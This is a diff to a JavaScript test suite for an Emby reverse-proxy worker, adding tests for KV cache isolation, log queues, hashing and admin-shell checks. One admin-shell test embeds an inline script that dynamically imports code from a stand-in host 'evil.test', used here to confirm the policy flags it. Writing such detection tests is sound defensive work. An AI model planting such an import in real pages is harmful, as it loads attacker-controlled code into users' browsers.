@@ -25,8 +25,11 @@ import {
   defineDatabaseStatusMethods,
   defineNodeRepositoryMethods,
   getDueScheduledClockSlots,
+  logBindingStates,
+  getNodeBindingCacheState,
   getRuntimeConfig,
   hasWorkerMetadataPrivateIdentity,
+  hashStableStringParts,
   invalidateNodesRevisionCache,
   invalidateRuntimeConfigCache,
   isEmbyWebProxyPath,
@@ -34,8 +37,10 @@ import {
   resolveEffectiveRoutingDecisionMode,
   resolvePlaybackInfoRewriteUrlMode,
   resolveRoutingDecisionMode,
+  runKvDataMutation,
   runSingleFlight,
   runWithConcurrency,
+  resetRuntimeBindingStates,
   sanitizeRuntimeConfig,
   serializeBoundedLogDetailJson
 } from "../worker/runtime/application-facades.js";
@@ -64,9 +69,12 @@ const {
   buildAdminRemoteShellLegacyCacheKeyRequest,
   buildAdminRemoteShellStoredResponse,
   buildAdminWarmSubrequest,
+  collectAdminInlineDynamicImports,
   ensureAdminRemoteTailwindConfigGlobal,
   fetchAdminRemoteShellStoredResponse,
+  getAdminRemoteShellAssetPolicyViolations,
   isAcceptedAdminHtmlDocumentContentType,
+  hasAdminRemoteShellAppRoot,
   isAdminWarmResponseSuccessful,
   isAdminIndexSetupForced,
   isAdminWarmRoute,
@@ -83,6 +91,12 @@ const kernel = testPlatform.kv;
 const cachePort = testPlatform.cache;
 
 assert.ok(routeTesting && typeof routeTesting === "object", "missing route test adapter");
+
+test("stable string-part hashing avoids delimiter collisions without JSON serialization", () => {
+  assert.equal(hashStableStringParts(["alpha", "beta"]), hashStableStringParts(["alpha", "beta"]));
+  assert.notEqual(hashStableStringParts(["alpha", "beta"]), hashStableStringParts(["alpha:beta"]));
+  assert.notEqual(hashStableStringParts(["a", "bc"]), hashStableStringParts(["ab", "c"]));
+});
 
 test("workflow facades replace capability ports and compatibility composition", () => {
   const facades = createWorkerApplication();
@@ -714,6 +728,24 @@ test("oversized log detail fallback remains valid JSON", () => {
   assert.deepEqual(JSON.parse(serialized), { truncated: true });
 });
 
+test("log detail serialization reads only its bounded field budget", () => {
+  let reads = 0;
+  const detail = {};
+  for (let index = 0; index < 64; index += 1) Object.defineProperty(detail, `field_${index}`, {
+    enumerable: true,
+    get() {
+      reads += 1;
+      return "x".repeat(1024);
+    }
+  });
+
+  const serialized = serializeBoundedLogDetailJson(detail);
+
+  assert.doesNotThrow(() => JSON.parse(serialized));
+  assert.ok(serialized.length <= 8192);
+  assert.ok(reads <= 32);
+});
+
 test("monthly traffic stats are on-demand cached without touching D1", async () => {
   const zoneId = `monthly-zone-${Date.now()}`;
   const { kv } = createInMemoryKvStore({
@@ -776,7 +808,7 @@ test("monthly traffic stats are on-demand cached without touching D1", async () 
     const firstPayload = await firstResponse.json();
     assert.equal(firstPayload.cfAnalyticsLoaded, true);
     assert.equal(firstPayload.period, "month");
-    assert.ok(graphqlRequestCount > 1);
+    assert.ok(graphqlRequestCount >= 1);
     assert.equal(firstPayload.totalBytes, graphqlRequestCount * 3072);
     const liveRequestCount = graphqlRequestCount;
     await Promise.all(backgroundTasks.splice(0));
@@ -2249,6 +2281,95 @@ test("runtime config invalidation prevents an older load from restoring stale ca
   invalidateRuntimeConfigCache();
 });
 
+test("runtime config caches are isolated by KV binding without an explicit namespace", async () => {
+  invalidateRuntimeConfigCache();
+  let firstReads = 0;
+  let secondReads = 0;
+  const firstEnv = {
+    ENI_KV: {
+      async get() {
+        firstReads += 1;
+        return { rateLimitRpm: 111 };
+      }
+    }
+  };
+  const secondEnv = {
+    ENI_KV: {
+      async get() {
+        secondReads += 1;
+        return { rateLimitRpm: 222 };
+      }
+    }
+  };
+
+  assert.equal((await getRuntimeConfig(firstEnv)).rateLimitRpm, 111);
+  assert.equal((await getRuntimeConfig(secondEnv)).rateLimitRpm, 222);
+  assert.equal((await getRuntimeConfig(firstEnv)).rateLimitRpm, 111);
+  assert.equal((await getRuntimeConfig(secondEnv)).rateLimitRpm, 222);
+  assert.equal(firstReads, 1);
+  assert.equal(secondReads, 1);
+
+  invalidateRuntimeConfigCache(firstEnv);
+  assert.equal((await getRuntimeConfig(firstEnv)).rateLimitRpm, 111);
+  assert.equal((await getRuntimeConfig(secondEnv)).rateLimitRpm, 222);
+  assert.equal(firstReads, 2);
+  assert.equal(secondReads, 1);
+  invalidateRuntimeConfigCache();
+});
+
+test("runtime config namespaces remain isolated within one KV binding", async () => {
+  invalidateRuntimeConfigCache();
+  let reads = 0;
+  const kv = {
+    async get() {
+      reads += 1;
+      return { rateLimitRpm: reads === 1 ? 101 : 202 };
+    }
+  };
+  const firstEnv = { ENI_KV: kv, __CONFIG_CACHE_NAMESPACE: "first" };
+  const secondEnv = { ENI_KV: kv, __CONFIG_CACHE_NAMESPACE: "second" };
+
+  assert.equal((await getRuntimeConfig(firstEnv)).rateLimitRpm, 101);
+  assert.equal((await getRuntimeConfig(secondEnv)).rateLimitRpm, 202);
+  assert.equal((await getRuntimeConfig(firstEnv)).rateLimitRpm, 101);
+  assert.equal((await getRuntimeConfig(secondEnv)).rateLimitRpm, 202);
+  assert.equal(reads, 2);
+  invalidateRuntimeConfigCache();
+});
+
+test("KV mutation queues serialize one binding without blocking another", async () => {
+  resetRuntimeBindingStates();
+  const sharedBinding = {};
+  const otherBinding = {};
+  const firstStarted = createDeferred();
+  const releaseFirst = createDeferred();
+  const otherStarted = createDeferred();
+  const events = [];
+
+  const first = runKvDataMutation(async () => {
+    events.push("first:start");
+    firstStarted.resolve();
+    await releaseFirst.promise;
+    events.push("first:end");
+  }, sharedBinding);
+  const second = runKvDataMutation(async () => {
+    events.push("second:start");
+    events.push("second:end");
+  }, sharedBinding);
+  const other = runKvDataMutation(async () => {
+    events.push("other:start");
+    otherStarted.resolve();
+    events.push("other:end");
+  }, otherBinding);
+
+  await Promise.all([firstStarted.promise, otherStarted.promise]);
+  assert.deepEqual(events, ["first:start", "other:start", "other:end"]);
+  releaseFirst.resolve();
+  await Promise.all([first, second, other]);
+  assert.deepEqual(events, ["first:start", "other:start", "other:end", "first:end", "second:start", "second:end"]);
+  resetRuntimeBindingStates();
+});
+
 test("runtime config writes roll back when metadata persistence fails", async () => {
   isolateState.SingleFlightTasks.clear();
   invalidateRuntimeConfigCache();
@@ -3373,6 +3494,158 @@ test("concurrent proxy cold reads share one node entity load", async () => {
   invalidateNodesRevisionCache();
 });
 
+test("node entity and summary caches are isolated by KV binding", async () => {
+  const createKv = (nodeName, target) => {
+    const summary = kernel.buildNodeSummary(nodeName, { target }).summary;
+    let entityReads = 0;
+    let summaryReads = 0;
+    return {
+      kv: {
+        async get(key) {
+          if (key === `${kernel.PREFIX}${nodeName}`) {
+            entityReads += 1;
+            return { target };
+          }
+          if (key === kernel.NODES_SUMMARY_INDEX_KEY) {
+            summaryReads += 1;
+            return [summary];
+          }
+          if (key === kernel.NODES_INDEX_META_KEY) return { revision: `${nodeName}-revision` };
+          return null;
+        },
+        async put() {}
+      },
+      reads: () => ({ entityReads, summaryReads })
+    };
+  };
+  const first = createKv("alpha", "https://first-origin.test");
+  const second = createKv("alpha", "https://second-origin.test");
+  const nodeOperations = { ...kernel };
+  Object.assign(nodeOperations, defineNodeRepositoryMethods({}, nodeOperations));
+  nodeOperations.upsertNodeSummaryEntry = async () => null;
+
+  const firstNode = await nodeOperations.getNode("alpha", { ENI_KV: first.kv }, null);
+  const secondNode = await nodeOperations.getNode("alpha", { ENI_KV: second.kv }, null);
+  assert.equal(new URL(firstNode.target).hostname, "first-origin.test");
+  assert.equal(new URL(secondNode.target).hostname, "second-origin.test");
+  assert.equal(first.reads().entityReads, 1);
+  assert.equal(second.reads().entityReads, 1);
+
+  assert.deepEqual((await nodeOperations.getNodesSummaryIndex(first.kv)).map(node => node.name), ["alpha"]);
+  assert.deepEqual((await nodeOperations.getNodesSummaryIndex(second.kv)).map(node => node.name), ["alpha"]);
+  assert.equal(first.reads().summaryReads, 1);
+  assert.equal(second.reads().summaryReads, 1);
+  assert.notEqual(getNodeBindingCacheState(first.kv), getNodeBindingCacheState(second.kv));
+});
+
+test("node cache fallback state never reuses the latest KV binding", () => {
+  const kv = {};
+  const boundState = getNodeBindingCacheState(kv);
+  const fallbackState = getNodeBindingCacheState();
+  boundState.NodeCache.set("alpha", { data: { target: "https://origin.test" } });
+
+  assert.notEqual(fallbackState, boundState);
+  assert.equal(fallbackState.NodeCache.has("alpha"), false);
+});
+
+test("access-log queues remain isolated by D1 binding", () => {
+  const firstDb = {};
+  const secondDb = {};
+  const context = { waitUntil() {} };
+  const config = { logEnabled: true, logWriteMode: "all", logWriteDelayMinutes: 5 };
+  const firstState = logBindingStates.get(firstDb);
+  const secondState = logBindingStates.get(secondDb);
+  firstState.LogQueue.length = 0;
+  secondState.LogQueue.length = 0;
+
+  testPlatform.fetch.logger.record({ DB: firstDb }, context, {
+    runtimeConfig: config,
+    nodeName: "first",
+    requestPath: "/System/Info",
+    requestMethod: "GET",
+    statusCode: 500
+  });
+  testPlatform.fetch.logger.record({ DB: secondDb }, context, {
+    runtimeConfig: config,
+    nodeName: "second",
+    requestPath: "/System/Ping",
+    requestMethod: "GET",
+    statusCode: 500
+  });
+
+  assert.equal(firstState.LogQueue.length, 1);
+  assert.equal(secondState.LogQueue.length, 1);
+  assert.equal(firstState.LogQueue[0].nodeName, "first");
+  assert.equal(secondState.LogQueue[0].nodeName, "second");
+});
+
+test("log config fallback reads the matching KV binding cache", async () => {
+  invalidateRuntimeConfigCache();
+  const firstDb = {};
+  const secondDb = {};
+  const context = { waitUntil() {} };
+  const firstEnv = { DB: firstDb, ENI_KV: { async get() { return { logEnabled: false }; } } };
+  const secondEnv = { DB: secondDb, ENI_KV: { async get() { return { logEnabled: true, logWriteDelayMinutes: 5 }; } } };
+  await getRuntimeConfig(firstEnv);
+  await getRuntimeConfig(secondEnv);
+
+  const firstState = logBindingStates.get(firstDb);
+  const secondState = logBindingStates.get(secondDb);
+  firstState.LogQueue.length = 0;
+  secondState.LogQueue.length = 0;
+  testPlatform.fetch.logger.record(firstEnv, context, {
+    nodeName: "first",
+    requestPath: "/System/Info",
+    requestMethod: "GET",
+    statusCode: 500
+  });
+  testPlatform.fetch.logger.record(secondEnv, context, {
+    nodeName: "second",
+    requestPath: "/System/Info",
+    requestMethod: "GET",
+    statusCode: 500
+  });
+
+  assert.equal(firstState.LogQueue.length, 0);
+  assert.equal(secondState.LogQueue.length, 1);
+  invalidateRuntimeConfigCache();
+  logBindingStates.reset();
+});
+
+test("incremental cleanup removes expired playback route snapshots", () => {
+  const kv = {};
+  const state = getNodeBindingCacheState(kv);
+  state.PlaybackRouteHotCache.set("stale", {
+    nodeName: "stale",
+    expiresAt: Date.now() - 1
+  });
+  isolateState.CleanupState.phase = 1;
+  isolateState.CleanupState.lastRunAt = 0;
+
+  cachePort.maybeCleanup({ ENI_KV: kv });
+
+  assert.equal(state.PlaybackRouteHotCache.has("stale"), false);
+});
+
+test("incremental cleanup keeps schedules isolated by KV binding", () => {
+  const firstKv = {};
+  const secondKv = {};
+  const firstState = getNodeBindingCacheState(firstKv);
+  const secondState = getNodeBindingCacheState(secondKv);
+  firstState.PlaybackRouteHotCache.set("first", { expiresAt: Date.now() - 1 });
+  secondState.PlaybackRouteHotCache.set("second", { expiresAt: Date.now() - 1 });
+  for (const state of [firstState, secondState]) {
+    state.CleanupState.phase = 1;
+    state.CleanupState.lastRunAt = 0;
+  }
+
+  cachePort.maybeCleanup({ ENI_KV: firstKv });
+  cachePort.maybeCleanup({ ENI_KV: secondKv });
+
+  assert.equal(firstState.PlaybackRouteHotCache.has("first"), false);
+  assert.equal(secondState.PlaybackRouteHotCache.has("second"), false);
+});
+
 test("proxy node misses use the short-lived node cache", async () => {
   isolateState.SingleFlightTasks.clear();
   isolateState.NodeCache.clear();
@@ -3690,6 +3963,25 @@ test("fresh remote shell recognizes only an exact app id attribute", async () =>
       assert.equal(payload.storedResponse.status, 200);
     }
   });
+});
+
+test("admin shell parsing rejects hidden markup and dynamic imports without recursive scanning", async () => {
+  const hiddenAppRootDocuments = [
+    '<!doctype html><html><body><!bogus <div id="app">></body></html>',
+    '<!doctype html><html><body><![CDATA[<div id="app"></div>]]></body></html>'
+  ];
+  for (const html of hiddenAppRootDocuments) assert.equal(hasAdminRemoteShellAppRoot(html), false);
+
+  const dynamicImportExpression = 'x++ / import("https://evil.test/runtime.js") / y;';
+  assert.deepEqual(collectAdminInlineDynamicImports(dynamicImportExpression), [{
+    index: dynamicImportExpression.indexOf("import"),
+    reference: "import("
+  }]);
+  assert.deepEqual(collectAdminInlineDynamicImports("{".repeat(10000) + "}".repeat(10000)), []);
+  assert.ok(getAdminRemoteShellAssetPolicyViolations(
+    `<!doctype html><html><body><div id="app"></div><script>${dynamicImportExpression}</script></body></html>`,
+    "https://example.test/index.html"
+  ).some((violation) => violation.includes("inline")));
 });
 
 test("fresh remote shell keeps the external asset policy boundary", async () => {
@@ -4108,6 +4400,20 @@ test("API MIME guard preserves explicit root navigation and legitimate non-HTML 
     requestTraits: { isApiRequest: true }
   };
   assert.equal(await proxyService.guardApiResponseMime(documentExecution, htmlState), htmlState);
+  for (const accept of ["*/*", "text/*;q=0.5"]) {
+    assert.equal(await proxyService.guardApiResponseMime({
+      ...documentExecution,
+      request: new Request("https://worker.test/alpha/", { headers: { Accept: accept } })
+    }, htmlState), htmlState);
+  }
+  const explicitlyRejectedHtml = await proxyService.guardApiResponseMime({
+    ...documentExecution,
+    request: new Request("https://worker.test/alpha/", {
+      headers: { Accept: "*/*;q=1, text/html;q=0" }
+    })
+  }, htmlState);
+  assert.equal(explicitlyRejectedHtml.response.status, 502);
+  assert.equal(explicitlyRejectedHtml.response.headers.get("X-Proxy-Mime-Guard"), "html-document");
 
   const textState = {
     response: new Response("Emby Server", { headers: { "Content-Type": "text/plain" } })
